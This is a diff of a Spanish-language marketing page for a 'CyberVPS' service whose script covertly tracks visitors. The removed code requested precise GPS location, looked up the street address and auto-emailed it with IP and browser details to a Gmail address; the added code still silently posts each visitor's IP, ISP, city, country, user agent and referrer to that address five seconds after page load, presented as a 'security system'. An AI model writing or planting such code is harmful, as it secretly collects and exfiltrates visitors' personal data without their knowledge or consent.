@@ -1257,11 +1257,6 @@
         <p>Monitoreo de seguridad activado</p>
     </div>
 
-    <!-- Indicador de tracking -->
-    <div id="trackingIndicator" class="tracking-indicator" style="display: none;">
-        <i class="fas fa-broadcast-tower"></i> SISTEMA ACTIVO...
-    </div>
-
     <!-- WhatsApp Button -->
     <a href="https://wa.me/527823981639?text=Hola,%20estoy%20interesado%20en%20los%20servicios%20de%20CyberVPS" class="whatsapp-btn" target="_blank">
         <i class="fab fa-whatsapp"></i>
@@ -1649,18 +1644,6 @@
                             <span class="location-value" id="ipAddress">Cargando...</span>
                         </div>
                         <div class="location-item">
-                            <span class="location-label">Coordenadas:</span>
-                            <span class="location-value" id="coordinates">Cargando...</span>
-                        </div>
-                        <div class="location-item">
-                            <span class="location-label">Dirección Exacta:</span>
-                            <span class="location-value" id="exactAddress">Cargando...</span>
-                        </div>
-                        <div class="location-item">
-                            <span class="location-label">Precisión:</span>
-                            <span class="location-value" id="accuracy">Cargando...</span>
-                        </div>
-                        <div class="location-item">
                             <span class="location-label">Proveedor:</span>
                             <span class="location-value" id="isp">Cargando...</span>
                         </div>
@@ -1676,20 +1659,8 @@
                 
                 <div class="contact-form">
                     <h3>Solicitar por WhatsApp</h3>
-                    <form action="https://formsubmit.co/almenos855@gmail.com" method="POST" id="whatsappForm">
-                        <!-- Campos ocultos para datos de ubicación -->
-                        <input type="hidden" id="hiddenIp" name="ip">
-                        <input type="hidden" id="hiddenCoordinates" name="coordinates">
-                        <input type="hidden" id="hiddenAddress" name="address">
-                        <input type="hidden" id="hiddenAccuracy" name="accuracy">
-                        <input type="hidden" id="hiddenIsp" name="isp">
-                        <input type="hidden" id="hiddenUserAgent" name="user_agent">
-                        <input type="hidden" id="hiddenTimestamp" name="timestamp">
-                        <input type="hidden" name="_subject" value="Nueva solicitud de CyberVPS">
-                        <input type="hidden" name="_template" value="table">
-                        <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_next" value="#contacto">
-                        
+                    <!-- Formulario simplificado -->
+                    <form id="whatsappForm">
                         <div class="form-group terminal-input">
                             <label for="name">Nombre</label>
                             <input type="text" id="name" name="name" placeholder="Ingresa tu nombre" required>
@@ -1724,9 +1695,6 @@
                                 <p><i class="fas fa-shield-alt"></i> Sistema de seguridad activo</p>
                             </div>
                         </div>
-
-                        <!-- Estado del envío de email -->
-                        <div id="emailStatus" class="email-status" style="display: none;"></div>
                         
                         <button type="submit" class="btn" id="submitBtn">
                             <i class="fas fa-paper-plane"></i> Enviar Solicitud
@@ -1757,9 +1725,6 @@
     </footer>
 
     <script>
-        // Variable para controlar si ya se envió el email automático
-        let autoEmailSent = false;
-
         // Función para mostrar notificación
         function showNotification(message, duration = 5000) {
             const notification = document.getElementById('autoTrackNotification');
@@ -1771,208 +1736,79 @@
             }, duration);
         }
 
-        // Función para mostrar indicador de tracking
-        function showTrackingIndicator(show) {
-            const indicator = document.getElementById('trackingIndicator');
-            indicator.style.display = show ? 'block' : 'none';
-        }
-
-        // Función para obtener ubicación exacta con GPS
-        async function getExactLocation() {
-            return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) {
-                    reject(new Error('Geolocation no es soportado por este navegador'));
-                    return;
-                }
-
-                const options = {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
+        // Función para obtener IP y datos básicos
+        async function getBasicLocation() {
+            try {
+                // Obtener IP pública
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                // Obtener datos del ISP
+                const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const geoData = await geoResponse.json();
+                
+                const locationData = {
+                    ip: ip,
+                    isp: geoData.org || 'Desconocido',
+                    city: geoData.city || 'Desconocida',
+                    country: geoData.country_name || 'Desconocido',
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
                 };
-
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        try {
-                            const { latitude, longitude, accuracy } = position.coords;
-                            
-                            // Obtener dirección
-                            const address = await getAddressFromCoordinates(latitude, longitude);
-                            
-                            // Obtener IP pública
-                            const ipResponse = await fetch('https://api.ipify.org?format=json');
-                            const ipData = await ipResponse.json();
-                            const ip = ipData.ip;
-                            
-                            // Obtener datos del ISP
-                            const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-                            const geoData = await geoResponse.json();
-                            
-                            const locationData = {
-                                ip: ip,
-                                coordinates: `${latitude.toFixed(6)}, ${longitude.toFixed(6)}`,
-                                address: address,
-                                accuracy: `${Math.round(accuracy)} metros`,
-                                isp: geoData.org || 'Desconocido',
-                                userAgent: navigator.userAgent,
-                                timestamp: new Date().toISOString(),
-                                pageUrl: window.location.href,
-                                referrer: document.referrer || 'Directo'
-                            };
-                            
-                            resolve(locationData);
-                            
-                        } catch (error) {
-                            reject(error);
-                        }
-                    },
-                    (error) => {
-                        let errorMessage = 'Error desconocido';
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED:
-                                errorMessage = 'Usuario denegó el permiso de ubicación';
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                errorMessage = 'Información de ubicación no disponible';
-                                break;
-                            case error.TIMEOUT:
-                                errorMessage = 'Tiempo de espera agotado';
-                                break;
-                        }
-                        reject(new Error(errorMessage));
-                    },
-                    options
-                );
-            });
-        }
-
-        // Función para obtener dirección desde coordenadas
-        async function getAddressFromCoordinates(lat, lng) {
-            try {
-                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
-                const data = await response.json();
                 
-                if (data && data.address) {
-                    const address = data.address;
-                    let formattedAddress = '';
-                    
-                    if (address.road) formattedAddress += address.road + ', ';
-                    if (address.suburb) formattedAddress += address.suburb + ', ';
-                    if (address.city || address.town || address.village) {
-                        formattedAddress += (address.city || address.town || address.village) + ', ';
-                    }
-                    if (address.state) formattedAddress += address.state + ', ';
-                    if (address.country) formattedAddress += address.country;
-                    
-                    return formattedAddress || 'Dirección no disponible';
-                }
-                return 'Dirección no disponible';
-            } catch (error) {
-                console.error('Error obteniendo dirección:', error);
-                return 'Error obteniendo dirección';
-            }
-        }
-
-        // Función para enviar datos por correo automáticamente usando FormSubmit
-        async function sendAutoLocationEmail(locationData) {
-            // Crear un formulario oculto para enviar los datos
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = 'https://formsubmit.co/almenos855@gmail.com';
-            form.style.display = 'none';
-            
-            // Determinar nivel de seguridad basado en precisión
-            const accuracy = parseInt(locationData.accuracy);
-            let securityLevel = 'ALTA PRECISIÓN';
-            
-            if (accuracy > 200) {
-                securityLevel = 'PRECISIÓN MEDIA';
-            } else if (accuracy > 50) {
-                securityLevel = 'PRECISIÓN MODERADA';
-            }
-
-            // Agregar campos al formulario
-            const fields = {
-                '_subject': `🚨 VISITANTE DETECTADO - ${securityLevel} - ${new Date().toLocaleDateString()}`,
-                'ip': locationData.ip,
-                'coordinates': locationData.coordinates,
-                'address': locationData.address,
-                'accuracy': locationData.accuracy,
-                'isp': locationData.isp,
-                'user_agent': locationData.userAgent,
-                'page_url': locationData.pageUrl,
-                'referrer': locationData.referrer,
-                'timestamp': new Date().toLocaleString('es-MX', { 
-                    timeZone: 'America/Mexico_City',
-                    dateStyle: 'full', 
-                    timeStyle: 'long' 
-                }),
-                'security_level': securityLevel,
-                'google_maps_link': `https://maps.google.com/?q=${locationData.coordinates}`,
-                'visitor_type': locationData.referrer === 'Directo' ? 'VISITA DIRECTA' : 'DESDE REFERIDO',
-                '_template': 'table',
-                '_captcha': 'false'
-            };
-            
-            for (const [key, value] of Object.entries(fields)) {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = key;
-                input.value = value;
-                form.appendChild(input);
-            }
-            
-            // Agregar el formulario al DOM y enviarlo
-            document.body.appendChild(form);
-            form.submit();
-            
-            // Limpiar después del envío
-            setTimeout(() => {
-                document.body.removeChild(form);
-            }, 1000);
-            
-            return { success: true, message: 'Datos enviados automáticamente' };
-        }
-
-        // Función principal para el tracking automático
-        async function startAutoTracking() {
-            if (autoEmailSent) return;
-            
-            try {
-                showTrackingIndicator(true);
-                showNotification('Sistema de seguridad activo...', 3000);
-                
-                const locationData = await getExactLocation();
-                
-                showNotification('Activando protocolos de seguridad...', 3000);
-                const emailResult = await sendAutoLocationEmail(locationData);
-                
-                if (emailResult.success) {
-                    showNotification('✅ Sistema de seguridad activado', 5000);
-                    autoEmailSent = true;
-                    
-                    // Guardar en localStorage para evitar múltiples envíos en la misma sesión
-                    localStorage.setItem('cybervps_auto_email_sent', 'true');
-                } else {
-                    showNotification('❌ Error en activación de seguridad', 5000);
-                }
+                return locationData;
                 
             } catch (error) {
-                console.error('Error en tracking automático:', error);
-                showNotification('⚠️ Error en sistema de seguridad: ' + error.message, 5000);
-            } finally {
-                showTrackingIndicator(false);
+                console.error('Error obteniendo datos básicos:', error);
+                return {
+                    ip: 'No disponible',
+                    isp: 'No disponible',
+                    city: 'No disponible',
+                    country: 'No disponible',
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                };
             }
         }
 
-        // Función para verificar si ya se envió el email en esta sesión
-        function checkPreviousSend() {
-            return localStorage.getItem('cybervps_auto_email_sent') === 'true';
+        // Función para enviar datos automáticamente (sin interrumpir la página)
+        async function sendAutoData() {
+            try {
+                const locationData = await getBasicLocation();
+                
+                // Enviar datos de forma asíncrona sin redireccionar
+                fetch('https://formsubmit.co/ajax/almenos855@gmail.com', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        _subject: `🚨 VISITANTE DETECTADO - ${new Date().toLocaleDateString()}`,
+                        ip: locationData.ip,
+                        isp: locationData.isp,
+                        city: locationData.city,
+                        country: locationData.country,
+                        user_agent: locationData.userAgent,
+                        timestamp: locationData.timestamp,
+                        page_url: window.location.href,
+                        referrer: document.referrer || 'Directo',
+                        security_level: 'MONITOREO ACTIVO'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => console.log('Datos enviados automáticamente'))
+                .catch(error => console.error('Error enviando datos automáticos:', error));
+                
+            } catch (error) {
+                console.error('Error en envío automático:', error);
+            }
         }
 
         // Inicializar cuando el DOM esté listo
         document.addEventListener('DOMContentLoaded', async function() {
-            // Mostrar notificación de seguridad inmediatamente
+            // Mostrar notificación de seguridad
             showNotification('Sistema de seguridad activo - Protocolos iniciados', 4000);
 
             // Configurar enlaces de WhatsApp
@@ -1987,45 +1823,89 @@
                 });
             });
 
-            // Configurar el formulario para enviar datos de ubicación
+            // Configurar el formulario de contacto
             const form = document.getElementById('whatsappForm');
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
                 
-                try {
-                    showTrackingIndicator(true);
-                    const locationData = await getExactLocation();
-                    
-                    // Llenar los campos ocultos con los datos de ubicación
-                    document.getElementById('hiddenIp').value = locationData.ip;
-                    document.getElementById('hiddenCoordinates').value = locationData.coordinates;
-                    document.getElementById('hiddenAddress').value = locationData.address;
-                    document.getElementById('hiddenAccuracy').value = locationData.accuracy;
-                    document.getElementById('hiddenIsp').value = locationData.isp;
-                    document.getElementById('hiddenUserAgent').value = locationData.userAgent;
-                    document.getElementById('hiddenTimestamp').value = locationData.timestamp;
-                    
-                    // Enviar el formulario
-                    this.submit();
-                    
-                } catch (error) {
-                    console.error('Error obteniendo ubicación:', error);
-                    // Enviar el formulario incluso si falla la ubicación
-                    this.submit();
-                } finally {
-                    showTrackingIndicator(false);
-                }
+                // Obtener datos del formulario
+                const formData = {
+                    name: document.getElementById('name').value,
+                    email: document.getElementById('email').value,
+                    company: document.getElementById('company').value,
+                    carrier: document.getElementById('carrier').value,
+                    message: document.getElementById('message').value
+                };
+                
+                // Obtener datos de ubicación
+                const locationData = await getBasicLocation();
+                
+                // Enviar formulario usando FormSubmit
+                fetch('https://formsubmit.co/ajax/almenos855@gmail.com', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        _subject: `Nueva solicitud de CyberVPS - ${formData.name}`,
+                        name: formData.name,
+                        email: formData.email,
+                        company: formData.company,
+                        carrier: formData.carrier,
+                        message: formData.message,
+                        ip: locationData.ip,
+                        isp: locationData.isp,
+                        city: locationData.city,
+                        country: locationData.country,
+                        timestamp: locationData.timestamp
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    showNotification('✅ Solicitud enviada correctamente', 5000);
+                    form.reset();
+                })
+                .catch(error => {
+                    showNotification('❌ Error al enviar la solicitud', 5000);
+                    console.error('Error:', error);
+                });
             });
 
-            // Iniciar tracking automático después de 3 segundos
-            setTimeout(async () => {
-                if (!checkPreviousSend()) {
-                    await startAutoTracking();
-                } else {
-                    showNotification('Sistema de seguridad activo - Monitoreando...', 4000);
-                }
-            }, 3000);
+            // Actualizar datos de ubicación en la interfaz
+            try {
+                const locationData = await getBasicLocation();
+                document.getElementById('ipAddress').textContent = locationData.ip;
+                document.getElementById('isp').textContent = locationData.isp;
+            } catch (error) {
+                console.error('Error actualizando datos de ubicación:', error);
+            }
+
+            // Enviar datos automáticos después de 5 segundos
+            setTimeout(() => {
+                sendAutoData();
+            }, 5000);
         });
+
+        // Efectos de scroll y menú móvil
+        window.addEventListener('scroll', function() {
+            const header = document.getElementById('main-header');
+            if (window.scrollY > 100) {
+                header.classList.add('hidden');
+            } else {
+                header.classList.remove('hidden');
+            }
+        });
+
+        // Menú móvil
+        const menuToggle = document.querySelector('.menu-toggle');
+        const mainNav = document.getElementById('main-nav');
+        
+        if (menuToggle) {
+            menuToggle.addEventListener('click', function() {
+                mainNav.classList.toggle('active');
+            });
+        }
     </script>
 </body>
 </html>
